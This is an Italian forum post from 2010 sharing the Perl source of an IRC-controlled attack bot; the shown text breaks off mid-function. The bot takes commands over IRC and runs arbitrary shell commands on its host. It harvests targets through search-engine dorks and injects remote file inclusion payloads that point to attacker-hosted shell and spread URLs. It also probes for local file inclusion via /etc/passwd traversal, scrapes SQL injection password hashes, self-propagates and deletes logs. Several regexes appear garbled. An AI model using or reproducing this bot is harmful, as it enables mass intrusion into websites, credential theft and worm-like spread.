03-06-2010 06:28 PM #1 DKiller92 
 Visualizza il profilo  View Forum Posts  Messaggio privato  Visita il sito 
 
Utente 
 
--------------------------------------------------------------------------------

Registrato dal:Feb 2009
residenza:127.0.0.1
Et� :17
Messaggi:820 Rfi/lfi bot scanners 
Eccovi qualche bot per RFI/LFI scritto in Perl studiato per IRC...sono rimasugli di quando navigavo su canali poco raccomandabili ma dovrebbero ancora funzionare...

PS: i mod mi scusino se la sezione � sbagliata, ma non sapevo dove postarli ;D



codice:
#!/usr/bin/perl

  #####################################################################################
  ##                                                                                 ##
  ##                                                                                 ##
  ##                                                                   04/04/2008    ##
  ##  Author  : watchdog                                                             ##
  ##  Team    : SecurityTeam / Hackers Gr0up                                         ##
  ##  Ircd    : 84.19.176.186                                                        ##
  ##  WebSite :                                                                      ##
  ##  Contact : http://security-sh3ll.com                                            ##
  ##                                                                                 ##
  ##  ## IMPORTANT ##                                                                ##
  ##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY          ##
  ##   # IMPROPERLY USE OF THIS TOOL. USE IT AT YOUR OWN RISK !!                     ##
  ##   # THIS TOOL HAS BEEN MADE TO HELP NET ADMINISTRATORS TO MAKE THEIR            ##
  ##   # SYSTEM MORE SECURE.                                                         ##
  ##  ##                                                                             ##
  ##                                                                                 ##
  ##  Release: v5 Private                                                            ##
  ##    I coded this tool only for fun , anyway it works well ! This is a Private    ##
  ##    Release, so if you have this Script, please, take care, and don't give it    ##
  ##    anyone ! Thank you.                                                          ##
  ##    It's a IrcBot. So, after connecting on your Ircd, you can scan for RFI,      ##
  ##    LFI, SQL Injection on sites using dorks.                                     ##
  ##    Anyway, u may know, that this one is the better bot ever created !           ##
  ##    Be happy ! :D                                                                ##
  ##                                                                                 ##
  ##  Features:                                                                      ##
  ##    [+]Sql Injection Scanner                                                     ##
  ##    [+]Remote File Inclusion Scanner                                             ##
  ##    [+]Local File Inclusion Scanner                                              ##
  ##    [+]Integrated Shell, so you can execute commands on the server               ##
  ##    [+]Security Mode to protect "dangerous" functions                            ##
  ##    [+]Spread Mode, to activate or disable Spread Function                       ##
  ##    [+]Bypass Engines ON: Google, Yahoo                                          ##
  ##    !: To "bypass" these engines, the Scanner just looks for websites on other   ##
  ##    engines that use the same bots than the main ones                            ##
  ##                                                                                 ##
  ##                                                                                 ##
  #####################################################################################



### !!_/ PRIVATE

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

#######################################################
## CONFIGURATION                                     //
#######################################################


my $id    = "http://xhebrail.xh.ohost.de/2.txt??"; #bosnia RFI Response
my $shell = "http://geoities.com/miztic_hell/tulang.txt????"; #Shell printed on the Vulnerable Site
my $ircd  = "201.11.1.27";
my $port  = "6667";
my $chan1 = "#bosnia"; #kimi for Scan
my $chan2 = "#lase"; #bot will be printed here too
my $nick="IndomIRC|".int(rand(99))."|"; # Scanner Nickname
my $sqlpidpr0c = 1; # This is the number of sites that the bot will test in the same time. For an accurated scann, it's reccomended to set a low number(1) 
# (Expecially if you are scanning on 0day bugs), so a lot of presunted vulnerable sites. Unless you will see the bot exiting by an excess flood!
# Instead, if you are scaning on old bugs, so not many results, you can put a higher number, so more speed.
my $rfipidpr0c = 50;

### USEFULL OPTIONS ( 0 => OFF  ;  1 => ON )

my $spread = "http://lasekmu.co.cc/lase/test.txt??";

my $spreadACT = 0; #0 ->disabled, 1 ->enabled
my $securityACT = 0; #0 ->disabled, 1 ->enabled

my $killpwd = "achap123"; #Password to Kill the Bot
my $chidpwd = "achap123"; #Password to change the RFI Response
my $cmdpwd = "achap123"; #Password to execute commands on the server
my $secpwd = "achap123";
my $spreadpwd = "achap123";

my $badspreadpwd != $spreadpwd;
my $badkillpwd != $killpwd;
my $badidpwd != $chidpwd;
my $badcmdpwd =! $cmdpwd;


#######################################################
## END OF CONFIGURATION                              //
#######################################################

open( $f1le, ">", "rip123.txt" );
print $f1le "\#!/usr/bin/perl\n";
print $f1le "exec(\"rm -rf \*log\*\")\;\n";
close $f1le;


@help = (
"14[!] 6!response  14> 12Test if the RFI Response is working",
"14[!] 6!chid <new rfi-id>  14> 12Change the RFI-Response",
"14[!] 6!killme  14> 12KILL The Bot",
"14[!] 6!new rfi bugs  14> 12Get the last 10 RFI bugs",
"14[!] 6!new lfi bugs  14> 12Get the last 10 LFI bugs",
"14[!] 6!new sql-inj bugs  14> 12Get the last 10 SQL Injection bugs",
"14[!] 6!rfi <bug> <dork> -p <sites/proc>  14> 12Start the RFI Scanner",
"14[!] 6!lfi <bug> <dork>  14> 12Start the LFI Scanner",
"14[!] 6!sql <bug> <dork> -p <sites/proc>  14> 12Start the SQL Injection Scanner",
"14[!] 6!cmd <bashline>  14> 12Gives command on the Bot's shell. Ex: (!cmd id) (!cmd uname -a)",
"14[!] 6/msg $nick !Sec ON/OFF -p <pwd>  14> 12To enable or disable Security Mode",
"14[!] 6!Spread ON/OFF  14> 12To enable or disable Spread Mode",
"14[!] 6!info  14> 12Get infos about the Bot"
);

my $sys = `uname -a`;
my $up = `uptime`;

if ($spreadACT == 0) {
    $t5 = "OFF";
}
elsif ($spreadACT == 1) {
    $t5 = "ON";
}

if ($securityACT == 0) {
    $y5 = "OFF";
}
elsif ($securityACT == 1) {
    $y5 = "ON";
}


$k=0;

if ( fork() == 0 ) {
    &irc( $ircd, $port, $chan1, $chan2, $nick );
}
else {
    exit;
}

sub irc () {
    my ( $ircd, $port, $chan1, $chan2, $nick ) = @_;
    $c0n = IO::Socket::INET->new(
        PeerAddr => "$ircd",
        PeerPort => "$port",
        Proto    => "tcp"
    ) or die "Can not connect on server!\n";
    $c0n->autoflush(1);
    print $c0n "NICK $nick\n";
    print $c0n "USER izzaura 8 *  : credit to d3v1l. modded by watchdog.\n";

    while ( $line = <$c0n> ) {

        my $sys = `uname -a`;
        my $up = `uptime`;

        if ($spreadACT == 0) {
            $t5 = "OFF";
        }
        elsif ($spreadACT == 1) {
            $t5 = "ON";
        }

        if ($securityACT == 0) {
            $y5 = "OFF";
        }
        elsif ($securityACT == 1) {
        $y5 = "ON";
        }

        @info = (
         "14[i] 6Release 14:12 perl IRC bot v5.1",
         "14[i] 6Author  14:12 d3v1l moded by watchdog",
         "14[i] 6Contact 14:12 admin\@fuckyouandyourself.com",
         "14[i] 6Uname -a14:12 $sys ",
         "14[i] 6Uptime  14:12 $up ",
         "14[i] 6Spread Mode1412 $t5 ",
         "14[i] 6Security Mode14:12 $y5 "
        );
        

        $k++;



        if ( $line =~ /^PING :(.*)/ ) {
            print $c0n "PONG :$1";
        }



        if ( $line =~ /001/ ) {
            print $c0n "JOIN $chan1\n";
            writ1("6perl IRC bot v5.1 4ON");
            writ1("6coded by d3v1l moded by watchdog");
            print $c0n "JOIN $chan2\n";
        }



        if (( $line =~ /PRIVMSG $chan1 :!help/ ) && ($securityACT == 0)) {
            @help;
            foreach my $e(@help){
                writ1("$e");
            }
        }
        elsif (( $line =~ /PRIVMSG $chan1 :!help/ ) && ($securityACT == 1)) {
            @help;
            $help[1] = "14[!] 6/msg $nick !chid <new rfi-id> -p <pwd>  14> 12Change the RFI-Response";
            $help[2] = "14[!] 6/msg $nick !killme -p <pwd>  14> 12KILL The Bot";
            $help[9] = "14[!] 6/msg $nick !cmd <bashline> <pwd>  14> 12Gives command on the Bot's shell. Ex: (!cmd id)";
            $help[11] = "14[!] 6/msg $nick !Spread ON/OFF -p <pwd>  14> 12To enable or disable Spread Mode";
            foreach my $e(@help){
                writ1("$e");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!info/) {
            @info;
            foreach my $n(@info) {
                writ1("$n");
            }
        }


        if ( $line =~ /PRIVMSG $chan1 :!new rfi bugs/ ) {
            my @re = query("nostrosito");
            writ1("14[15+14] 6Last 10 RFI bugs:");
            foreach my $n (@re) {
                writ1("12$n");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!new lfi bugs/ ) {
            my @re = query("nostrosito");
            writ1("14[15+14] 6Last 10 LFI bugs:");
            foreach my $n (@re) {
                writ1("12$n");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!new sql-inj bugs/ ) {
            my @re = query("nostrosito");
            writ1("14[15+14] 6Last 10 SQL Inj bugs:");
            foreach my $n (@re) {
                writ1("12$n");
            }
        }



        if ( $line =~ /PRIVMSG $chan1 :!response/ ) {
            my $re = query($id);
            if ( $re =~ /d3v1l/ ) {
                writ1("14[15+14]6 RFI Response is 12WORKING");
            }
            else {
                writ1("14[15-14]6 RFI Response is 12NOT WORKING");
            }
        }



        if (($line=~ /PRIVMSG $nick :!chids+(.*) -p $chidpwd/) && ($securityACT == 1)) {
            $newid = $1;
            $id = $newid;
            writ1("14[15+14]6 RFI Response 12changed ");
            writ1("14[15+14]6 New RFI Response: 12$id");
        }
        elsif (($line=~ /PRIVMSG $nick :!chids+(.*) -p $badidpwd/) && ($securityACT == 1)) {
            writ1("14[15-14]6 Error Changing the RFI-Response (bad Password)!");
        }
        elsif (($line=~ /PRIVMSG $chan1 :!chids+(.*)/) && ($securityACT == 0)) {
            $newid = $1;
            $id = $newid;
            writ1("14[15+14]6 RFI Response changed ");
            writ1("14[15+14]6 New RFI Response: 12$id");
        }



        if (($line=~ /PRIVMSG $nick :!killme -p $killpwd/) && ($securityACT == 1)) {
            writ1("14[15!14]6 Bye!");
            print $c0n "QUIT";
            exec("perl rm.txt && pkill perl \n"); 
        }
        elsif (($line=~ /PRIVMSG $nick :!killme -p $badkillpwd/) && ($securityACT == 1)) {
            writ1("14[15-14] 6Error Killing the Bot (Null or bad Password) !");
        }
        elsif (($line=~ /PRIVMSG $chan1 :!killme/) && ($securityACT == 0)) {
               writ1("14[15!14]6 Bye!");
               print $c0n "QUIT";
               exec("perl rm.txt && pkill perl \n"); 
        }



        if (($line=~ /PRIVMSG $nick :!cmds+(.*) -p $cmdpwd/) && ($securityACT == 1) && (fork() == 0)) {
            my $cmd = $1;
            if ($cmd =~ /cd (.*)/) {
                chdir("$1") || priv8("Can't change dir"); 
                return;
            }
            my @output = `$1`;
            my $count = 0;
            foreach my $out(@output) {
                #$count++;
                #if ($count == 5) {
                    #sleep(3);
                    #$count = 0;
                #}
                priv8("14[15+14]6 $out ");
           }
           exit;
        }
        elsif  (($line=~ /PRIVMSG $nick :!cmds+(.*) -p $badcmdpwd/) && ($securityACT == 1) && (fork() == 0)) {
            priv8("14[15-14]6 Error using the shell (Null or bad Password) ! ");
        }
        elsif  (($line=~ /PRIVMSG $chan1 :!cmds+(.*)/) && ($securityACT == 0) && (fork() == 0)) {
            my $cmd = $1;
            if ($cmd =~ /cd (.*)/) {
                $dir = $1;
                chomp($dir);
                chdir ($dir) || writ1("Can't change dir"); 
            }
            my @output = `$1`;
            my $count = 0;
            foreach my $out(@output) {
                #$count++;
                #if ($count == 5) {
                    #sleep(3);
                    #$count = 0;
                #}
                writ1("14[15+14]6 $out ");
           }
           exit;
        }



        if ($line=~ /PRIVMSG $nick :!Secs+(.*) -p $secpwd/) {
            $s = $1;
            if ($s =~ /ON/) {
                $securityACT = 1;
                writ1("14[15+14]6 Security Mode Activated !! ");
            }
            elsif ($s =~ /OFF/) {
                $securityACT = 0;
                writ1("14[15+14]6 Security Mode Disabled !! ");
            }
        }



        if (($line=~ /PRIVMSG $nick :!Spreads+(.*) -p $spreadpwd/) && ($securityACT == 1)) {
            $t = $1;
            if ($t =~ /ON/) {
                $spreadACT = 1;
                writ1("14[15+14]6 Spread Mode Activated !! ");
            }
            elsif ($t =~ /OFF/) {
                $spreadACT = 0;
                writ1("14[15+14]6 Security Mode Disabled !! ");
            }
        }
        elsif (($line=~ /PRIVMSG $nick :!Spreads+(.*) -p $badspreadpwd/) && ($securityACT == 1)) {
            writ1("14[15-14]6 Error changing the Spread Mode (Null or bad Password) ! ");
        }
        elsif (($line=~ /PRIVMSG $chan1 :!Spreads+(.*)/) && ($securityACT == 0)) {
            $t = $1;
            if ($t =~ /ON/) {
                $spreadACT = 1;
                writ1("14[15+14]6 Spread Mode Activated !! ");
            }
            elsif ($t =~ /OFF/) {
                $spreadACT = 0;
                writ1("14[15+14]6 Spread Mode Disabled !! ");
            }
        }



        if (($line =~ /PRIVMSG $chan1 :!rfis+(.*?)s+(.*)s+-p(.+[0-9])/) && (fork() == 0)) {
            my ($bug, $dork, $rfipid) = ($1, $2, $3);
            writ1("14[15*14]6 RFI Scan started 14->12 $rfipid sites/process");
            writ1("14[15+14]6 Bug:12 $bug ");
            $d0rk = clean($dork);
            writ1("14[15+14]6 Dork:12 $dork ");
            my $a    = $k . "a";
            my $n4me = $a . "siti.txt";
            find($d0rk, $n4me);
            rfi($bug, $n4me, $d0rk, $rfipid);
            writ1("14[15-14]6 RFI Scan finished  14>12 $d0rk");
            writ1("14[15?14]6 #Coded by d3v1l moded by watchdog");
            exit(0);
        }





        if (($line =~ /PRIVMSG $chan1 :!lfis+(.*?)s+(.*)/) && (fork() == 0)) {
            my ($bug, $dork) = ($1, $2);
            writ1("14[15*14]6 RFI Scan started");
            writ1("14[15+14]6 Bug:12 $bug ");
            $d0rk = clean($dork);
            writ1("14[15+14]6 Dork:12 $dork ");
            my $b    = $k . "b";
            my $n4me = $b . "siti.txt";
            find($d0rk, $n4me);
            lfi($bug, $n4me, $d0rk);
            writ1("14[15-14]6 LFI Scan finished  14>12 $d0rk");
            writ1("14[15?14]6 #Coded by d3v1l moded by watchdog");
            exit(0);
        }



        if (($line =~ /PRIVMSG $chan1 :!sqls+(.*?)s+(.*)s+-p(.+[0-9])/) && (fork() == 0)) {
            my ($bug, $dork, $sqlpid) = ($1, $2, $3);
            writ1("14[15*14]6 SQL Inj started 14->12 $sqlpid sites/process ");
            writ1("14[15+14]6 Bug:12 $bug ");
            $d0rk = clean($dork);
            writ1("14[15+14]6 Dork:12 $dork ");
            my $c    = $k . "c";
            my $n4me = $c . "siti.txt";
            find($d0rk, $n4me);
            sql($bug, $n4me, $d0rk, $sqlpid);
            writ1("14[15-14]6 SQL Inj finished  14>12 $d0rk");
            writ1("14[15?14]6 #Coded by d3v1l moded by watchdog");
            exit(0);
        }
    }
}




sub find () {
    my $dork = $_[0];
    my $name = $_[1];
    my @engine;
    $engine[0] = fork();
    if ( $engine[0] == 0 ) {
        my @glist = google( $dork, $name );
        writ1("14[15~14] 6>GOOGLE :12  ". scalar(@glist). "  14>12  $dork" );
        exit;
    }
    $engine[1] = fork();
    if ( $engine[1] == 0 ) {
        my @all = alltheweb( $dork, $name );
        writ1("14[15~14] 6>ALLTHEWEB :12  ". scalar(@all). "  14>12  $dork" );
        exit;
   }
    $engine[2] = fork();
    if ( $engine[2] == 0 ) {
        my @alt = altavista( $dork, $name );
        writ1("14[15~14] 6>ALTAVISTA :12  ". scalar(@alt). "  14>12  $dork" );
        exit;
    }
    $engine[3] = fork();
    if ( $engine[3] == 0 ) {
        my @emsn = msn( $dork, $name );
        writ1("14[15~14] 6>MSN :12  ". scalar(@emsn). "  14>12  $dork" );
        exit;
    }
    $engine[4] = fork();
    if ( $engine[4] == 0 ) {
        my @ysites = yahoo( $dork, $name );
        writ1("14[15~14] 6>YAHOO :12  ". scalar(@ysites). "  14>12  $dork" );
        exit;
    }
    $engine[5] = fork();
    if ( $engine[5] == 0 ) {
        my @asksites = ask( $dork, $name );
        writ1("14[15~14] 6>ASK :12  ". scalar(@asksites). "  14>12  $dork" );
        exit;
    }
    $engine[6] = fork();
    if ($engine[6] == 0) {
        my @aolsites = aol($dork,$name);
        writ1("14[15~14] 6>AOL :12  ". scalar(@aolsites). "  14>12  $dork" );
        exit;
    }
    $engine[7] = fork();
    if ( $engine[7] == 0 ) {
        my @dmozsites = dmoz( $dork, $name );
        writ1("14[15~14] 6>DMOZ :12  ". scalar(@dmozsites). "  14>12  $dork" );
        exit;
    }
    $engine[8] = fork();
    if ($engine[8] == 0) {
        my @webdesites = webde($dork,$name);
        writ1("14[15~14] 6>WEB.DE :12  ". scalar(@webdesites). "  14>12  $dork" );
        exit;
    }
    $engine[9] = fork();
    if ($engine[9] == 0) {
        my @einetsites = einet($dork,$name);
        writ1("14[15~14] 6>eiNET.BET :12  ". scalar(@einetsites). "  14>12  $dork" );
        exit;
    }

    foreach my $e(@engine){
        waitpid($e,0);
    }

}

sub rfi () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rfipid = $_[3]; 
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    writ1("14[15*14]6 >EXPLOITABLES:12    ". scalar(@toexploit). "  14>12  $dork" );
    sleep(1);
    writ1("14[15+14]6 Exploiting STARTED !!" );
    foreach my $site (@toexploit) {
        my $test  = "http://" . $site . $bug . $id . "??";
        print "$test\n";
        $count++;
        if ( $count % $rfipid == 0 ) {
        foreach my $f(@forks){
                waitpid($f,0);
            }
        $num = 0;
        }
        if($count %100 == 0){
            writ1("14[15%14]6 >Exploiting12    ". $count. "  14/12  ". scalar(@toexploit). " ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . $bug . $id . "??";
            my $print = "http://" . $site . $bug . $shell . "?";
            my $re    = query($test);
            if ( $re =~ /d3v1l/ && $re =~ /uid=/ ) {
                os($test);
                writ1("6(12safe: 3OFF6) 6(12os:3 $os6)3 $print ");
                writ1("6(12uname -a6)3  $un");
                writ1("6(12uid / gid6)3  $id1");
                writ1("6(12hdd space6)  12free: 6(3$free6) 12used: 6(3$used6) 12tot: 6(3$all6)");
                writ2("");
                writ2("6(12safe: 3OFF6) 6(12os:3 $os6)3 $print ");
                writ2("6(12uname -a6)3  $un 6(12uid / gid6)3  $id1");
                if ( $spreadACT == 1 ) {
                    writ1("14[15+14]6 Trying to spread .. ");
                    sleep(2);
                    my $test2 = "http://" . $site . $bug . $spread . "?";
                    my $reqz  = query($test2);
                }
            }
            elsif ( $re =~ /d3v1l/ ) {
                os($test);
                writ1("6(safe: 4ON6) 6(os:4 $os6)4 $print ");
                writ1("6(12uname -a6)4  $un");
                writ1("6(12uid / gid6)4  $id1");
                writ1("6(12hdd space6)  12free: 6(4$free6) 12used: 6(4$used6) 12tot: 6(4$all6)");
                writ2("");
                writ2("6(safe: 4ON6) 6(os:4 $os6)4 $print ");
                if ( $spreadACT == 1 ) {
                    writ1("14[15+14]6 Trying to spread .. ");
                    sleep(2);
                    my $test2 = "http://" . $site . $bug . $spread . "?";
                    my $reqz  = query($test2);
                }
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
    waitpid($f,0);
    }
}

sub lfi () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    writ1("14[15*14]6 >EXPLOITABLES:12    ". scalar(@toexploit). "  14>12  $dork" );
    writ1("14[15+14]6 Exploiting STARTED !!" );
    foreach my $site (@toexploit) {
        $count++;
        if ( $count % 100 == 0 ) {
        foreach my $f(@forks){
                waitpid($f,0);
            }
        $num = 0;
        }
        if ( $count % 300 == 0 ) {
            writ1("14[15%14]6 >Exploiting12    ". $count. "  14/12  ". scalar(@toexploit). "");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $inj   = "../../../../../../../../../../../../../etc/passwd%00";
            my $test  = "http://" . $site . $bug . $inj;
            my $print = "http://" . $site . $bug . $inj;
            my $re    = query($test);
            if ( $re =~ /root:x:/ ) {
                writ1("6(12LFI6)3 $print");
                writ2("6(12LFI6)3 $print");
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
    waitpid($f,0);
    }
}

sub sql () {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2]; 
    my $sqlpid = $_[3]; 
    my @forks;
    my $num = 0;
    open( filez, '<', $name );
    while ( my $a = <filez> ) {
        $a =~ s/n//g;
        push( @tot, $a );
    }
    close filez;
    remove($name);
    my @toexploit = unici(@tot);
    writ1("14[15*14]6 >EXPLOITABLES:12    ". scalar(@toexploit). "  14>12  $dork" );
    writ1("14[15+14]6 Exploiting STARTED !!" );
    foreach my $site (@toexploit) {
        my $test  = "http://" . $site . $bug;
        print "$test\n";
        $count++;
        if($count %$sqlpid == 0){
        foreach my $f(@forks){
                waitpid($f,0);
            }
        $num = 0;
    }
        if($count %100 == 0){
            writ1("14[15%14]6 >Exploiting12    ". $count. "  14/12  ". scalar(@toexploit). " ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://" . $site . $bug;
            my $print = "http://" . $site . $bug;
            my $re    = query($test);
            if ( $re =~ /(.*):(.*)([0-9,a-f]{32})/ ) { 
                my ($user,$hash) = ($2,$3);
                $user =~ s/<(.*)>//g;
                if ($user !~ /(/|<|>|")/) {
                    if ($sqlpid == $sqlpidpr0c) {
                        writ1("6(12SQL INJ6)3 $print");
                        writ1("6(12User6)3 $user");
                        writ1("6(12Hash6)3 $hash");
                        writ2("6(12SQL INJ6)3 $print");
                    }
                    elsif  ($sqlpid > $sqlpidpr0c) { 
                        writ1("6(12SQL INJ6)3 $print");
                    }
                }
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
    waitpid($f,0);
    }
}

sub google () {
    my @gsites;
    my $key = $_[0];
    my $name = $_[1];
    my $gtest = ("www.google.com/search?q=hi&hl=en&start=10&sa=N");
    my $ret = query1($gtest);
    if ($ret =~ /2008 Google/) {
        @gsites = gfind($key,$name);
    }
    else {
        writ1("14[15!14]4 Banned 6by Google Engine, trying to bypass it !");
        @gsites = gbypass($key,$name);
    }
    return @gsites;
}

sub gfind () {
    my @list;
    my $key = $_[0];
    my $name= $_[1];
    for ($p = 0;$p <= 900; $p += 100) {
        my $g0gle = ("www.google.it/search?q=".key($key)."&num=100&hl=it&as_qdr=all&start=".$p."&sa=N");
        my $gr = query1($g0gle);
        while ($gr =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $k = $1;
            if ($k !~ /google/) {
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$kn";
                }
                close $filez;
                push(@list, @grep);
            }
        }
    }
    return @list;
}

sub gbypass () { # Euroseek uses the same search type of google
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $p = 0 ; $p <= 1000 ; $p += 10 ) {
        my $gp = ("http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$p."&string=".key($key));
        my $re = query($gp);
        while ($re =~ m/<a href="http:\/\/(.+?)\" class=\"searchlinklink\">/g ) {
            my $k = $1;
            my @grep = links($k);
            open( $filez, ">>", $name );
            foreach my $k (@grep) {
                print $filez "$kn";
            }
            close $filez;
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub alltheweb() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
        my $All = ( "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=". key($key) . "&o=". $i );
        my $re = query($All);
        while ( $re =~ m/<span class="?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            open( $filez, ">>", $name );
            foreach my $k (@grep) {
                print $filez "$kn";
            }
            close $filez;
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub altavista() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ($b = 1;$b <= 1000;$b += 10) {
        my $Alt = ( "http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=". key($key) . "&stq=". $b );
        my $re = query($Alt);
        while ( $re =~ m/<span class=ngrn>(.+?)//g ) {
            if ( $1 !~ /altavista/ ) {
                my $k = $1;
                $k =~ s/<//g;
                $k =~ s/ //g;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$k\n";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
        if ( $re =~ /target="_self\">Succ/ ) { }
        else {
            return @lst;
        }
    }
    return @lst;
}

sub msn() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
        my $Msn = ( "http://search.live.com/results.aspx?q=". key($key). "&first=". $b. "&FORM=PERE" );
        my $re = query($Msn);
        while ( $re =~ m/<a href="?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live/ ) {
                my $k    = $1;
                my @grep = links($k);
                open( $filez, ">>", $name );
                foreach my $k (@grep) {
                    print $filez "$kn";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub yahoo () {
    my @ysites;
    my $key = $_[0];
    my $name = $_[1];
    my $ytest = ("http://www.search.yahoo.com/search?p=hello&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=1");
    my $ret = query($ytest);
    if ($ret =~ /We did not find results for/) {
        return @ysites;
    }
    elsif ($ret =~ /title="Yahoo! Search results for hello\"/) {
        @ysites = yfind($key,$name);
        return @ysites;
    }
    else {
        writ1("14[15!14]4 Banned 6by Yahoo Engine, trying to bypass it !");
        @ysites = ybypass($key,$name);
        return @ysites;
    }
}

sub yfind() {
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
        for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
            my $ylink = ( "http://search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
            my $re = query($ylink);
            while ( $re =~ m/<a class="yschttl\" href=\"http:\/\/(.+?)\" >/g ) {
                my $k = $1;
                if ($k !~ /yahoo|<b>/) {
                    my @grep = links($k);
                    open( $filez, ">>", $name );
                    foreach my $k (@grep) {
                        print $filez "$kn";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
    return @lst;
}  

sub ybypass () { # GoodSearch uses the same search type of Yahoo
    my @lst;
    my $key  = $_[0];
    my $name = $_[1];
    my $ybytest = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($key)."&page=1&osmax=16");
    my $res = query($ybytest);
    if ($res =~ /Your search did not yield any results/){
        return @lst;
    }
    else {
        for $p(1..50){
            my $ybylink = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($key)."&page=".$p."&osmax=16");
            my $rek = query($ybylink);
            while ($rek =~ m/href="(.+?)\">(.+?)<\/a>/g) {
                my $tsite = $2;
                if (($tsite =~ /\./) && ($tsite !~ /<|>| /)){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsiten";
                    }
                    close $filez;
                    push( @lst, @grep );   
                }       
            }
        }
        return @lst;
    }
} 


sub ask () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $askt = ("http://it.ask.com/web?q=".key($key)."&qsrc=1&o=312&l=dir&dm=all");
    my $asktest = query($askt);
    if ($asktest =~ /non ha prodotto alcun risultato/) {
        return @lst;
    }
    else {
        for ($p=0;$p<=20;$p++){
            my $asklink = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=612B74535B00F6CA7678625658F9B98C&dm=all&page=".$p);
            my $re = query($asklink);
            while($re =~ m/href="http:\/\/(.+?)\"/g){
                my $tsite = $1;
                if ($tsite !~ /ask|wikipedia/){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsiten";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
        return @lst;
    }
}

sub aol () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $aolt = ("http://search.aol.com/aol/search?invocationType=topsearchbox.search&query=".key($key));
    my $atest = query($aolt);
    if ($atest =~ /returned no results.</h3>/) {
        return @lst;
    }
    else {
        for ($p=1;$p<=100;$p++){
            my $aollink = ("http://search.aol.com/aol/search?query=".key($key)."&page=".$p."&nt=SG2&do=Search&invocationType=comsearch30&clickstreamid=3154480101243260576");
            my $re = query($aollink);
            while($re =~ m/<p class="durl find\" property=\"f:durl\">(.+?)\n-/g) {
                my $tsite = $1;
                my @grep = links($tsite);
                open( $filez, ">>", $name );
                foreach my $tsite (@grep) {
                    print $filez "$tsiten";
                }
                close $filez;
                push( @lst, @grep );
            }
        }
    return @lst;
    }
}     

sub dmoz () {
    my $key = $_[0]; 
    my $name = $_[1];
    my @lst;
    my $dmtest = ("http://search.dmoz.org/cgi-bin/search?search=".key($key));
    my $dmq = query($dmtest);
    if ($dmq =~ /No <b><a href="http:\/\/dmoz.org\/\">Open Directory Project<\/a><\/b> results found/){
        return @lst;
    }
    elsif ($dmq =~ /of (.+?)\)<p>/){
        my $ftot = $1;
        if ($ftot <= 20) {
            $max = 1;
        }
        else {
            my $to = $ftot / 20;
            if ($to =~ /(.+).(.+?)/){
                $uik = $1 * 20;
                $max = $uik +1;
            }
            elsif ($to =~ /[0-9]/) {
                my $to--;
                my $rej = $to * 20;
                $max = $rej +1;
            }
        }   
    }    
    for ($p=1;$p<=$max;$p += 20){
        my $dmozlink = ("http://search.dmoz.org/cgi-bin/search?search=".key($key)."&utf8=1&locale=it_it&start=".$p);
        my $re = query($dmozlink);
        if ($re =~ /">Next<\/a>/) {
            while($re =~ m/<a href=\"http:\/\/(.+?)\"/g) {
                my $tsite = $1;
                if ($tsite !~ /dmoz/){
                    my @grep = links($tsite);
                    open( $filez, ">>", $name );
                    foreach my $tsite (@grep) {
                        print $filez "$tsiten";
                    }
                    close $filez;
                    push( @lst, @grep );
                }
            }
        }
    }
    return @lst;
